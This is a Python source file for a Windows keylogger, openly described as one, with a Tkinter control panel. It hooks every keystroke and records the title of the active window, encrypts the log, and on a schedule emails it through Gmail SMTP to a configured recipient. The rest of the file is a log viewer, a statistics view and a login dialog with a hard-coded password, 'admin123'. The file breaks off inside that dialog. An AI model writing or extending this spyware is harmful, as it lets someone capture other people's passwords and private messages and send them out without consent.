# Let's generate the final full keylogger code with GUI, password protection, system tray icon, better formatting, encryption, and auto-email sending.
# This code assumes the user has installed required packages:
# pip install pynput cryptography schedule pystray pillow pywin32

import os
import smtplib
import schedule
import time
import json
import threading
from datetime import datetime
from pynput import keyboard
from cryptography.fernet import Fernet
import win32gui
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, simpledialog
from PIL import Image, ImageTk
import pystray
import logging
from logging.handlers import RotatingFileHandler
import sys
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from keylogger import keylogger

# Setup logging to both file and console
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        RotatingFileHandler('keylogger.log', maxBytes=1000000, backupCount=5),
        logging.StreamHandler(sys.stdout)  # Ensure output goes to console
    ]
)

# Print startup message
print("Starting Keylogger...")
logging.info("Application starting")

log_file = "keylog.txt"
current_window = None
listener = None
is_logging = False
tray_icon = None

# Encryption key
def load_key():
    key_file = "secret.key"
    if not os.path.exists(key_file):
        key = Fernet.generate_key()
        with open(key_file, "wb") as f:
            f.write(key)
    else:
        with open(key_file, "rb") as f:
            key = f.read()
    return key

fernet = Fernet(load_key())

def write_log(data):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {data}\n")
    logging.debug(f"Logged: {data}")  # Changed to debug level

def encrypt_log():
    try:
        with open(log_file, "rb") as f:
            encrypted = fernet.encrypt(f.read())
        with open(log_file, "wb") as f:
            f.write(encrypted)
        logging.debug("Log file encrypted successfully")
    except Exception as e:
        logging.error(f"Error encrypting log file: {e}")

def send_email():
    try:
        encrypt_log()
        with open("config.json", "r") as f:
            config = json.load(f)

        sender = config["email"]
        password = config["password"]
        receiver = config["receiver"]

        with open(log_file, "rb") as f:
            content = f.read()

        subject = f"Keylogger Logs - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        message = f"Subject: {subject}\n\nEncrypted log is attached below."

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(sender, password)
        server.sendmail(sender, receiver, message + "\n\n" + content.decode())
        server.quit()

        open(log_file, "w").close()
        logging.debug("Email sent successfully")
    except Exception as e:
        logging.error(f"Error sending email: {e}")

def on_press(key):
    global current_window
    try:
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if window != current_window:
            current_window = window
            write_log(f"Window Change: {window}")
            logging.debug(f"Window changed to: {window}")

        if hasattr(key, 'char') and key.char is not None:
            if key.char == ' ':
                write_log("Key Pressed: [SPACE]")
            else:
                write_log(f"Key Pressed: {key.char}")
        else:
            special_key = str(key).replace("Key.", "").upper()
            write_log(f"Special Key Pressed: [{special_key}]")
    except Exception as e:
        logging.error(f"Error in key press handler: {e}")

def start_logging():
    global listener, is_logging
    if not is_logging:
        try:
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            is_logging = True
            write_log("--- Logging Started ---")
            logging.debug("Keylogger started successfully")
        except Exception as e:
            logging.error(f"Error starting keylogger: {e}")

def stop_logging():
    global listener, is_logging
    if listener and is_logging:
        try:
            listener.stop()
            is_logging = False
            write_log("--- Logging Stopped ---")
            logging.debug("Keylogger stopped successfully")
        except Exception as e:
            logging.error(f"Error stopping keylogger: {e}")

def run_schedule():
    logging.debug("Starting schedule thread")
    while True:
        schedule.run_pending()
        time.sleep(1)

class KeyloggerGUI:
    def __init__(self, root):
        logging.info("Initializing GUI")
        print("Initializing GUI...")
        
        self.root = root
        self.root.title("Secure Keylogger")
        self.root.geometry("900x700")
        self.root.configure(bg='#f0f0f0')
        
        # Make sure window is visible
        self.root.deiconify()
        self.root.lift()
        self.root.focus_force()
        
        # Style configuration
        self.style = ttk.Style()
        self.style.configure('TButton', padding=5, font=('Arial', 10))
        self.style.configure('TLabel', font=('Arial', 10))
        self.style.configure('Header.TLabel', font=('Arial', 14, 'bold'))
        self.style.configure('Status.TLabel', font=('Arial', 12, 'bold'))
        
        self.setup_ui()
        logging.info("GUI setup completed")
        print("GUI setup completed")
        
    def setup_ui(self):
        logging.info("Setting up UI components")
        print("Setting up UI components...")
        
        try:
            # Main frame
            main_frame = ttk.Frame(self.root, padding="20")
            main_frame.pack(fill=tk.BOTH, expand=True)
            
            # Header
            header_frame = ttk.Frame(main_frame)
            header_frame.pack(fill=tk.X, pady=(0, 20))
            ttk.Label(header_frame, text="Secure Keylogger", style='Header.TLabel').pack(side=tk.LEFT)
            
            # Control buttons frame
            control_frame = ttk.LabelFrame(main_frame, text="Controls", padding="10")
            control_frame.pack(fill=tk.X, pady=10)
            
            # Control buttons
            button_frame = ttk.Frame(control_frame)
            button_frame.pack(fill=tk.X, pady=5)
            
            self.start_button = ttk.Button(button_frame, text="Start Logging", command=self.toggle_logging, width=15)
            self.start_button.pack(side=tk.LEFT, padx=5)
            
            ttk.Button(button_frame, text="View Logs", command=self.view_logs, width=15).pack(side=tk.LEFT, padx=5)
            ttk.Button(button_frame, text="Settings", command=self.show_settings, width=15).pack(side=tk.LEFT, padx=5)
            ttk.Button(button_frame, text="Quit", command=self.quit_app, width=15).pack(side=tk.RIGHT, padx=5)
            
            # Status frame
            status_frame = ttk.LabelFrame(main_frame, text="Status", padding="10")
            status_frame.pack(fill=tk.X, pady=10)
            
            self.status_label = ttk.Label(status_frame, text="Status: Stopped", style='Status.TLabel')
            self.status_label.pack(pady=5)
            
            # Log viewer frame
            log_frame = ttk.LabelFrame(main_frame, text="Log Viewer", padding="10")
            log_frame.pack(fill=tk.BOTH, expand=True, pady=10)
            
            # Filter controls
            filter_frame = ttk.Frame(log_frame)
            filter_frame.pack(fill=tk.X, pady=5)
            
            # Log type filter
            ttk.Label(filter_frame, text="Filter:").pack(side=tk.LEFT, padx=5)
            self.filter_var = tk.StringVar(value="All")
            filter_combo = ttk.Combobox(filter_frame, textvariable=self.filter_var, 
                                      values=["All", "Key Presses", "Window Changes", "Special Keys", "Status"],
                                      state="readonly", width=15)
            filter_combo.pack(side=tk.LEFT, padx=5)
            filter_combo.bind('<<ComboboxSelected>>', lambda e: self.filter_logs())
            
            # Date filter
            ttk.Label(filter_frame, text="Date:").pack(side=tk.LEFT, padx=5)
            self.date_var = tk.StringVar(value="All")
            date_combo = ttk.Combobox(filter_frame, textvariable=self.date_var, 
                                    values=["All", "Today", "Last Hour", "Last 24 Hours"],
                                    state="readonly", width=15)
            date_combo.pack(side=tk.LEFT, padx=5)
            date_combo.bind('<<ComboboxSelected>>', lambda e: self.filter_logs())
            
            # Search frame
            search_frame = ttk.Frame(log_frame)
            search_frame.pack(fill=tk.X, pady=5)
            
            ttk.Label(search_frame, text="Search:").pack(side=tk.LEFT, padx=5)
            self.search_var = tk.StringVar()
            search_entry = ttk.Entry(search_frame, textvariable=self.search_var, width=30)
            search_entry.pack(side=tk.LEFT, padx=5)
            ttk.Button(search_frame, text="Search", command=self.search_logs).pack(side=tk.LEFT, padx=5)
            ttk.Button(search_frame, text="Clear", command=self.clear_search).pack(side=tk.LEFT, padx=5)
            
            # Log text area with better formatting
            self.log_text = scrolledtext.ScrolledText(
                log_frame, 
                wrap=tk.WORD, 
                font=('Consolas', 10),
                bg='#f8f8f8',
                padx=10,
                pady=10
            )
            self.log_text.pack(fill=tk.BOTH, expand=True)
            
            # Configure tags for different log types
            self.log_text.tag_configure("timestamp", foreground="blue")
            self.log_text.tag_configure("window", foreground="green")
            self.log_text.tag_configure("key", foreground="red")
            self.log_text.tag_configure("special", foreground="purple")
            self.log_text.tag_configure("status", foreground="orange")
            self.log_text.tag_configure("search", background="yellow")
            
            # Update log viewer periodically
            self.update_log_viewer()
            
            # Make sure window is visible
            self.root.update()
            self.root.deiconify()
            
            logging.info("UI components setup completed")
            print("UI components setup completed")
            
        except Exception as e:
            logging.error(f"Error setting up UI: {e}")
            print(f"Error setting up UI: {e}")
            messagebox.showerror("Error", f"Failed to setup UI: {e}")
        
    def toggle_logging(self):
        logging.debug("Toggling logging state")
        if not is_logging:
            start_logging()
            self.start_button.config(text="Stop Logging")
            self.status_label.config(text="Status: Running", foreground="green")
        else:
            stop_logging()
            self.start_button.config(text="Start Logging")
            self.status_label.config(text="Status: Stopped", foreground="red")
            
    def view_logs(self):
        logging.debug("Opening log viewer window")
        log_window = tk.Toplevel(self.root)
        log_window.title("Log Viewer")
        log_window.geometry("1000x700")
        log_window.configure(bg='#f5f6f7')
        
        # Make window modal
        log_window.transient(self.root)
        log_window.grab_set()
        
        # Main frame
        main_frame = ttk.Frame(log_window, padding="20")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Header
        header_frame = ttk.Frame(main_frame)
        header_frame.pack(fill=tk.X, pady=(0, 20))
        
        ttk.Label(
            header_frame,
            text="Log Viewer",
            font=('Arial', 18, 'bold'),
            foreground='#2c3e50'
        ).pack(side=tk.LEFT)
        
        # Create notebook for tabs
        notebook = ttk.Notebook(main_frame)
        notebook.pack(fill=tk.BOTH, expand=True)
        
        # All Logs tab
        all_logs_frame = ttk.Frame(notebook, padding="10")
        notebook.add(all_logs_frame, text="All Logs")
        
        # Key Presses tab
        key_presses_frame = ttk.Frame(notebook, padding="10")
        notebook.add(key_presses_frame, text="Key Presses")
        
        # Window Changes tab
        window_changes_frame = ttk.Frame(notebook, padding="10")
        notebook.add(window_changes_frame, text="Window Changes")
        
        # Statistics tab
        stats_frame = ttk.Frame(notebook, padding="10")
        notebook.add(stats_frame, text="Statistics")
        
        # Setup each tab
        self.setup_log_tab(all_logs_frame, "All")
        self.setup_log_tab(key_presses_frame, "Key Presses")
        self.setup_log_tab(window_changes_frame, "Window Changes")
        self.setup_stats_tab(stats_frame)
        
        # Center window
        log_window.update_idletasks()
        width = log_window.winfo_width()
        height = log_window.winfo_height()
        x = (log_window.winfo_screenwidth() // 2) - (width // 2)
        y = (log_window.winfo_screenheight() // 2) - (height // 2)
        log_window.geometry(f'{width}x{height}+{x}+{y}')
        
    def setup_log_tab(self, parent_frame, log_type):
        # Control frame
        control_frame = ttk.Frame(parent_frame)
        control_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Date filter
        ttk.Label(control_frame, text="Date Range:", font=('Arial', 10)).pack(side=tk.LEFT, padx=5)
        date_var = tk.StringVar(value="All Time")
        date_combo = ttk.Combobox(
            control_frame,
            textvariable=date_var,
            values=["All Time", "Today", "Last Hour", "Last 24 Hours", "Custom"],
            state="readonly",
            width=15
        )
        date_combo.pack(side=tk.LEFT, padx=5)
        
        # Search
        ttk.Label(control_frame, text="Search:", font=('Arial', 10)).pack(side=tk.LEFT, padx=5)
        search_var = tk.StringVar()
        search_entry = ttk.Entry(control_frame, textvariable=search_var, width=30)
        search_entry.pack(side=tk.LEFT, padx=5)
        
        # Export button
        ttk.Button(
            control_frame,
            text="Export",
            command=lambda: self.export_logs(log_type),
            width=10
        ).pack(side=tk.RIGHT, padx=5)
        
        # Refresh button
        ttk.Button(
            control_frame,
            text="Refresh",
            command=lambda: self.refresh_logs(self.log_text, log_type, date_var.get(), search_var.get()),
            width=10
        ).pack(side=tk.RIGHT, padx=5)
        
        # Log display
        log_text = scrolledtext.ScrolledText(
            parent_frame,
            wrap=tk.WORD,
            font=('Consolas', 10),
            bg='#ffffff',
            padx=10,
            pady=10
        )
        log_text.pack(fill=tk.BOTH, expand=True)
        
        # Configure tags for syntax highlighting
        log_text.tag_configure("timestamp", foreground="#3498db")
        log_text.tag_configure("window_change", foreground="#27ae60")
        log_text.tag_configure("key_press", foreground="#e74c3c")
        log_text.tag_configure("special_key", foreground="#9b59b6")
        log_text.tag_configure("status", foreground="#f39c12")
        log_text.tag_configure("highlight", background="#fff3cd")
        
        # Initial load
        self.refresh_logs(log_text, log_type, "All Time", "")
        
        # Bind events
        date_combo.bind('<<ComboboxSelected>>', 
            lambda e: self.refresh_logs(log_text, log_type, date_var.get(), search_var.get()))
        search_entry.bind('<Return>', 
            lambda e: self.refresh_logs(log_text, log_type, date_var.get(), search_var.get()))
            
    def setup_stats_tab(self, parent_frame):
        # Stats display
        stats_text = scrolledtext.ScrolledText(
            parent_frame,
            wrap=tk.WORD,
            font=('Consolas', 10),
            bg='#ffffff',
            padx=10,
            pady=10
        )
        stats_text.pack(fill=tk.BOTH, expand=True)
        
        self.update_stats(stats_text)
        
        # Refresh button
        ttk.Button(
            parent_frame,
            text="Refresh Stats",
            command=lambda: self.update_stats(stats_text),
            width=15
        ).pack(pady=10)
        
    def refresh_logs(self, text_widget, log_type, date_filter, search_term):
        try:
            text_widget.delete(1.0, tk.END)
            
            with open(log_file, "r", encoding="utf-8") as f:
                logs = f.readlines()
            
            now = datetime.now()
            search_term = search_term.lower()
            
            for line in logs:
                if not line.strip():
                    continue
                    
                # Apply date filter
                try:
                    timestamp_str = line[line.find('[')+1:line.find(']')]
                    log_time = datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")
                    
                    if date_filter == "Today" and log_time.date() != now.date():
                        continue
                    elif date_filter == "Last Hour" and (now - log_time).total_seconds() > 3600:
                        continue
                    elif date_filter == "Last 24 Hours" and (now - log_time).total_seconds() > 86400:
                        continue
                except:
                    continue
                
                # Apply type filter
                if log_type == "Key Presses" and "Key Pressed:" not in line:
                    continue
                elif log_type == "Window Changes" and "Window Change:" not in line:
                    continue
                
                # Apply search filter
                if search_term and search_term not in line.lower():
                    continue
                
                # Insert with appropriate tag
                text_widget.insert(tk.END, line)
                self.apply_syntax_highlighting(text_widget, line)
                
        except Exception as e:
            logging.error(f"Error refreshing logs: {e}")
            messagebox.showerror("Error", f"Failed to refresh logs: {e}")
            
    def apply_syntax_highlighting(self, text_widget, line):
        start = f"{text_widget.index('end-1c linestart')}"
        
        # Highlight timestamp
        if '[' in line and ']' in line:
            ts_start = line.find('[')
            ts_end = line.find(']') + 1
            text_widget.tag_add("timestamp", f"{start}+{ts_start}c", f"{start}+{ts_end}c")
        
        # Highlight based on log type
        if "Window Change:" in line:
            text_widget.tag_add("window_change", start, f"{start} lineend")
        elif "Key Pressed:" in line:
            text_widget.tag_add("key_press", start, f"{start} lineend")
        elif "Special Key Pressed:" in line:
            text_widget.tag_add("special_key", start, f"{start} lineend")
        elif "--- Logging" in line:
            text_widget.tag_add("status", start, f"{start} lineend")
            
    def update_stats(self, text_widget):
        try:
            with open(log_file, "r", encoding="utf-8") as f:
                logs = f.readlines()
            
            # Initialize counters
            total_keys = 0
            window_changes = 0
            special_keys = 0
            most_common_windows = {}
            most_common_keys = {}
            
            # Analyze logs
            for line in logs:
                if "Key Pressed:" in line:
                    total_keys += 1
                    key = line.split("Key Pressed:")[-1].strip()
                    most_common_keys[key] = most_common_keys.get(key, 0) + 1
                elif "Special Key Pressed:" in line:
                    special_keys += 1
                elif "Window Change:" in line:
                    window_changes += 1
                    window = line.split("Window Change:")[-1].strip()
                    most_common_windows[window] = most_common_windows.get(window, 0) + 1
            
            # Sort dictionaries
            most_common_windows = dict(sorted(most_common_windows.items(), key=lambda x: x[1], reverse=True)[:5])
            most_common_keys = dict(sorted(most_common_keys.items(), key=lambda x: x[1], reverse=True)[:5])
            
            # Format statistics
            stats = f"""Log Statistics
=============

Total Activity
-------------
Total Keys Pressed: {total_keys}
Special Keys Pressed: {special_keys}
Window Changes: {window_changes}

Most Active Windows
-----------------
{"".join(f"{window}: {count} times\n" for window, count in most_common_windows.items())}

Most Common Keys
--------------
{"".join(f"{key}: {count} times\n" for key, count in most_common_keys.items())}
"""
            
            text_widget.delete(1.0, tk.END)
            text_widget.insert(tk.END, stats)
            
        except Exception as e:
            logging.error(f"Error updating statistics: {e}")
            text_widget.delete(1.0, tk.END)
            text_widget.insert(tk.END, f"Error generating statistics: {e}")
            
    def export_logs(self, log_type):
        try:
            from datetime import datetime
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"keylogger_export_{log_type.lower().replace(' ', '_')}_{timestamp}.txt"
            
            with open(log_file, "r", encoding="utf-8") as source, \
                 open(filename, "w", encoding="utf-8") as target:
                
                for line in source:
                    if log_type == "All" or \
                       (log_type == "Key Presses" and "Key Pressed:" in line) or \
                       (log_type == "Window Changes" and "Window Change:" in line):
                        target.write(line)
            
            messagebox.showinfo("Success", f"Logs exported to {filename}")
            
        except Exception as e:
            logging.error(f"Error exporting logs: {e}")
            messagebox.showerror("Error", f"Failed to export logs: {e}")

    def filter_logs(self):
        try:
            with open(log_file, "r", encoding="utf-8") as f:
                logs = f.read()
            
            self.log_text.delete(1.0, tk.END)
            current_filter = self.filter_var.get()
            date_filter = self.date_var.get()
            
            now = datetime.now()
            for line in logs.split('\n'):
                if not line.strip():
                    continue
                    
                # Apply date filter
                if date_filter != "All":
                    try:
                        timestamp_str = line[line.find('[')+1:line.find(']')]
                        log_time = datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")
                        
                        if date_filter == "Today" and log_time.date() != now.date():
                            continue
                        elif date_filter == "Last Hour" and (now - log_time).total_seconds() > 3600:
                            continue
                        elif date_filter == "Last 24 Hours" and (now - log_time).total_seconds() > 86400:
                            continue
                    except:
                        continue
                
                # Apply type filter
                if current_filter == "All" or \
                   (current_filter == "Key Presses" and "Key Pressed:" in line) or \
                   (current_filter == "Window Changes" and "Window Change:" in line) or \
                   (current_filter == "Special Keys" and "Special Key Pressed:" in line) or \
                   (current_filter == "Status" and ("--- Logging Started ---" in line or "--- Logging Stopped ---" in line)):
                    
                    self.log_text.insert(tk.END, line + "\n")
                    self.highlight_line(line)
            
            # Apply search highlighting if there's a search term
            if self.search_var.get():
                self.search_logs()
                
        except Exception as e:
            logging.error(f"Error filtering logs: {e}")
            messagebox.showerror("Error", f"Could not filter logs: {e}")
            
    def highlight_line(self, line):
        if not line:
            return
            
        start = "1.0"
        while True:
            start = self.log_text.search(line, start, tk.END)
            if not start:
                break
            end = f"{start}+{len(line)}c"
            
            # Highlight based on log type
            if line.startswith('['):
                self.log_text.tag_add("timestamp", start, end)
            if "Window Change:" in line:
                self.log_text.tag_add("window", start, end)
            if "Key Pressed:" in line:
                self.log_text.tag_add("key", start, end)
            if "Special Key Pressed:" in line:
                self.log_text.tag_add("special", start, end)
            if "--- Logging" in line:
                self.log_text.tag_add("status", start, end)
                
            start = end
            
    def search_logs(self):
        search_term = self.search_var.get().lower()
        self.log_text.tag_remove("search", "1.0", tk.END)
        
        if search_term:
            start = "1.0"
            while True:
                start = self.log_text.search(search_term, start, tk.END, nocase=True)
                if not start:
                    break
                end = f"{start}+{len(search_term)}c"
                self.log_text.tag_add("search", start, end)
                start = end
                
    def clear_search(self):
        self.search_var.set("")
        self.log_text.tag_remove("search", "1.0", tk.END)
        
    def show_settings(self):
        logging.debug("Showing settings window")
        settings_window = tk.Toplevel(self.root)
        settings_window.title("Email Settings")
        settings_window.geometry("700x600")
        settings_window.configure(bg='#f5f6f7')
        
        # Main frame
        main_frame = ttk.Frame(settings_window, padding="20")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Title
        ttk.Label(
            main_frame,
            text="Email Configuration",
            font=('Arial', 18, 'bold'),
            foreground='#2c3e50'
        ).pack(pady=(0, 20))
        
        # Form frame
        form_frame = ttk.LabelFrame(main_frame, text="Email Settings", padding="20")
        form_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        # Email settings
        # Sender email
        sender_frame = ttk.Frame(form_frame)
        sender_frame.pack(fill=tk.X, pady=5)
        ttk.Label(sender_frame, text="Sender Email:", width=15).pack(side=tk.LEFT)
        self.sender_var = tk.StringVar()
        ttk.Entry(sender_frame, textvariable=self.sender_var, width=40).pack(side=tk.LEFT, padx=5)
        
        # Password
        pass_frame = ttk.Frame(form_frame)
        pass_frame.pack(fill=tk.X, pady=5)
        ttk.Label(pass_frame, text="App Password:", width=15).pack(side=tk.LEFT)
        self.password_var = tk.StringVar()
        self.password_entry = ttk.Entry(pass_frame, textvariable=self.password_var, show="●", width=40)
        self.password_entry.pack(side=tk.LEFT, padx=5)
        
        # Show/Hide password
        self.show_password = tk.BooleanVar()
        ttk.Checkbutton(
            pass_frame,
            text="Show",
            variable=self.show_password,
            command=lambda: self.password_entry.configure(show="" if self.show_password.get() else "●")
        ).pack(side=tk.LEFT)
        
        # Receiver email
        receiver_frame = ttk.Frame(form_frame)
        receiver_frame.pack(fill=tk.X, pady=5)
        ttk.Label(receiver_frame, text="Receiver Email:", width=15).pack(side=tk.LEFT)
        self.receiver_var = tk.StringVar()
        ttk.Entry(receiver_frame, textvariable=self.receiver_var, width=40).pack(side=tk.LEFT, padx=5)
        
        # Frequency
        freq_frame = ttk.Frame(form_frame)
        freq_frame.pack(fill=tk.X, pady=5)
        ttk.Label(freq_frame, text="Send Frequency:", width=15).pack(side=tk.LEFT)
        self.frequency_var = tk.StringVar(value="60")
        ttk.Combobox(
            freq_frame,
            textvariable=self.frequency_var,
            values=["15", "30", "60", "120", "240"],
            state="readonly",
            width=10
        ).pack(side=tk.LEFT, padx=5)
        ttk.Label(freq_frame, text="minutes").pack(side=tk.LEFT)
        
        # Test email section
        test_frame = ttk.LabelFrame(form_frame, text="Test Email", padding="10")
        test_frame.pack(fill=tk.X, pady=20)
        
        # Status message
        self.test_status_var = tk.StringVar()
        ttk.Label(
            test_frame,
            textvariable=self.test_status_var,
            font=('Arial', 10)
        ).pack(side=tk.LEFT, padx=10, fill=tk.X, expand=True)
        
        # Test button
        tk.Button(
            test_frame,
            text="📧 Send Test Email",
            command=self.test_email_settings,
            bg='#28a745',
            fg='white',
            font=('Arial', 11, 'bold'),
            relief=tk.FLAT,
            padx=20,
            pady=8,
            cursor='hand2'
        ).pack(side=tk.RIGHT, padx=10)
        
        # Buttons frame
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill=tk.X, pady=20)
        
        # Save button
        tk.Button(
            button_frame,
            text="Save Settings",
            command=self.save_settings,
            bg='#007bff',
            fg='white',
            font=('Arial', 11, 'bold'),
            relief=tk.FLAT,
            padx=20,
            pady=8,
            cursor='hand2'
        ).pack(side=tk.LEFT, padx=5)
        
        # Cancel button
        tk.Button(
            button_frame,
            text="Cancel",
            command=settings_window.destroy,
            bg='#6c757d',
            fg='white',
            font=('Arial', 11),
            relief=tk.FLAT,
            padx=20,
            pady=8,
            cursor='hand2'
        ).pack(side=tk.LEFT, padx=5)
        
        # Load existing settings
        self.load_settings()
        
        # Center window
        settings_window.update_idletasks()
        width = settings_window.winfo_width()
        height = settings_window.winfo_height()
        x = (settings_window.winfo_screenwidth() // 2) - (width // 2)
        y = (settings_window.winfo_screenheight() // 2) - (height // 2)
        settings_window.geometry(f'{width}x{height}+{x}+{y}')

    def test_email_settings(self):
        try:
            sender = self.sender_var.get().strip()
            password = self.password_var.get().strip()
            receiver = self.receiver_var.get().strip()
            
            if not sender or not password or not receiver:
                self.test_status_var.set("❌ Please fill in all fields")
                return
            
            self.test_status_var.set("📤 Sending test email...")
            self.root.update()
            
            # Create test message with HTML formatting
            subject = "Keylogger Test Email"
            message = f"""Subject: {subject}
Content-Type: text/html

<html>
<body style="font-family: Arial, sans-serif; padding: 20px;">
    <h2 style="color: #2c3e50;">Keylogger Test Email</h2>
    <p style="color: #34495e;">This is a test email from your keylogger configuration.</p>
    <p style="color: #7f8c8d;">Sent at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    <hr>
    <p style="color: #95a5a6; font-size: 12px;">If you received this email, your email settings are configured correctly.</p>
</body>
</html>
"""
            
            # Try to send email
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(sender, password)
            server.sendmail(sender, receiver, message)
            server.quit()
            
            self.test_status_var.set("✅ Test email sent successfully!")
            logging.info("Test email sent successfully")
            
        except smtplib.SMTPAuthenticationError:
            self.test_status_var.set("❌ Authentication failed")
            messagebox.showerror("Error", 
                "Authentication failed!\n\n"
                "Please make sure you're using an App Password, not your regular Gmail password.\n"
                "Go to Google Account → Security → App passwords to generate one.")
            
        except Exception as e:
            self.test_status_var.set("❌ Failed to send email")
            logging.error(f"Error sending test email: {e}")
            messagebox.showerror("Error", f"Failed to send test email:\n\n{str(e)}")

    def load_settings(self):
        try:
            with open("config.json", "r") as f:
                config = json.load(f)
                self.sender_var.set(config.get("email", ""))
                self.password_var.set(config.get("password", ""))
                self.receiver_var.set(config.get("receiver", ""))
                self.frequency_var.set(str(config.get("frequency", "60")))
        except:
            pass
            
    def save_settings(self):
        try:
            # Validate email addresses
            sender = self.sender_var.get().strip()
            receiver = self.receiver_var.get().strip()
            password = self.password_var.get().strip()
            frequency = int(self.frequency_var.get())
            
            if not sender or not receiver or not password:
                messagebox.showerror("Error", "All fields are required")
                return
                
            if "@" not in sender or "@" not in receiver:
                messagebox.showerror("Error", "Invalid email address")
                return
                
            config = {
                "email": sender,
                "password": password,
                "receiver": receiver,
                "frequency": frequency
            }
            
            with open("config.json", "w") as f:
                json.dump(config, f, indent=4)
                
            # Update schedule
            schedule.clear()
            schedule.every(frequency).minutes.do(send_email)
            
            messagebox.showinfo("Success", "Settings saved successfully")
            logging.info("Email settings saved and schedule updated")
        except Exception as e:
            logging.error(f"Error saving settings: {e}")
            messagebox.showerror("Error", f"Failed to save settings: {e}")
            
    def quit_app(self):
        if messagebox.askyesno("Quit", "Are you sure you want to quit?"):
            stop_logging()
            if tray_icon:
                tray_icon.stop()
            self.root.quit()
            
    def update_log_viewer(self):
        self.filter_logs()
        self.root.after(5000, self.update_log_viewer)

def launch_gui():
    logging.info("Launching GUI")
    print("Launching GUI...")
    
    def ask_password():
        logging.info("Asking for password")
        print("Showing password dialog...")
        
        try:
            root = tk.Tk()
            root.withdraw()
            
            dialog = tk.Toplevel(root)
            dialog.title("Secure Access")
            dialog.geometry("400x500")
            dialog.configure(bg='#f8f9fa')
            dialog.resizable(False, False)
            
            # Center the dialog
            dialog.update_idletasks()
            width = dialog.winfo_width()
            height = dialog.winfo_height()
            x = (dialog.winfo_screenwidth() // 2) - (width // 2)
            y = (dialog.winfo_screenheight() // 2) - (height // 2)
            dialog.geometry(f'{width}x{height}+{x}+{y}')
            
            result = [False]
            
            # Main frame
            main_frame = ttk.Frame(dialog, padding="20")
            main_frame.pack(fill=tk.BOTH, expand=True)
            
            # Logo frame
            logo_frame = ttk.Frame(main_frame)
            logo_frame.pack(fill=tk.X, pady=(0, 20))
            
            # Lock icon
            canvas = tk.Canvas(logo_frame, width=80, height=80, bg='#f8f9fa', highlightthickness=0)
            canvas.pack()
            canvas.create_oval(25, 15, 55, 45, width=3, outline='#2c3e50')
            canvas.create_rectangle(15, 35, 65, 75, width=3, outline='#2c3e50')
            
            # Title
            ttk.Label(
                main_frame,
                text="Secure Keylogger",
                font=('Arial', 20, 'bold'),
                foreground='#2c3e50'
            ).pack(pady=(0, 5))
            
            ttk.Label(
                main_frame,
                text="Please authenticate to continue",
                font=('Arial', 10),
                foreground='#7f8c8d'
            ).pack(pady=(0, 20))
            
            # Login frame
            login_frame = ttk.Frame(main_frame, padding=20)
            login_frame.pack(fill=tk.BOTH, expand=True)
            
            # Username
            username_frame = ttk.Frame(login_frame)
            username_frame.pack(fill=tk.X, pady=5)
            
            ttk.Label(username_frame, text="👤").pack(side=tk.LEFT, padx=5)
            username_entry = ttk.Entry(username_frame, width=30)
            username_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
            username_entry.insert(0, "admin")
            username_entry.configure(state='readonly')
            
            # Password
            password_frame = ttk.Frame(login_frame)
            password_frame.pack(fill=tk.X, pady=5)
            
            ttk.Label(password_frame, text="🔒").pack(side=tk.LEFT, padx=5)
            password_var = tk.StringVar()
            password_entry = ttk.Entry(
                password_frame,
                textvariable=password_var,
                show="●",
                width=30
            )
            password_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
            
            # Show/Hide password
            show_password = tk.BooleanVar()
            ttk.Checkbutton(
                password_frame,
                text="👁",
                variable=show_password,
                command=lambda: password_entry.configure(show="" if show_password.get() else "●")
            ).pack(side=tk.LEFT, padx=5)
            
            # Status message
            status_var = tk.StringVar()
            status_label = ttk.Label(
                login_frame,
                textvariable=status_var,
                foreground='#e74c3c'
            )
            status_label.pack(pady=10)
            
            # Progress bar (hidden initially)
            progress_var = tk.DoubleVar()
            progress = ttk.Progressbar(
                login_frame,
                variable=progress_var,
                maximum=100,
                mode='determinate'
            )
            
            def login():
                if password_var.get() == "admin123":
                    progress.pack(fill=tk.X, pady=10)
                    for i in range(101):
                        progress_var.set(i)
                        dialog.update()
                        time.sleep(0.01)
                    result[0] = True
                    dialog.destroy()
                else:
                    status_var.set("Invalid password. Please try again.")
                    password_entry.delete(0, tk.END)
                    dialog.bell()
            
            # Login button
            login_button = tk.Button(
                login_frame,
                text="Login",
                command=login,
                bg='#007bff',
                fg='white',
                font=('Arial', 12, 'bold'),
                cursor='hand2',
                relief=tk.FLAT,
                padx=30,
                pady=10
            )
            login_button.pack(pady=20)
            
            # Remember me
            remember_frame = ttk.Frame(login_frame)
            remember_frame.pack(fill=tk.X, pady=5)
            
            ttk.Checkbutton(
                remember_frame,
                text="Remember me"
            ).pack(side=tk.LEFT)
            
            ttk.Label(
                remember_frame,
                text="Forgot password?",
                foreground='#3498db',
                cursor='hand2'
            ).pack(side=tk.RIGHT)
            
            # Security tips
            tip_frame = ttk.LabelFrame(main_frame, text="Security Tips", padding=10)
            tip_frame.pack(fill=tk.X, pady=10)
            
            tips = [
                "🔒 Use a strong password",
                "⚠️ Never share your credentials",
                "🔄 Change password regularly"
            ]
            
            for tip in tips:
                ttk.Label(
                    tip_frame,
                    text=tip,
                    foreground='#7f8c8d'
                ).pack(anchor=tk.W)
            
            # Bind enter key
            dialog.bind('<Return>', lambda e: login())
            
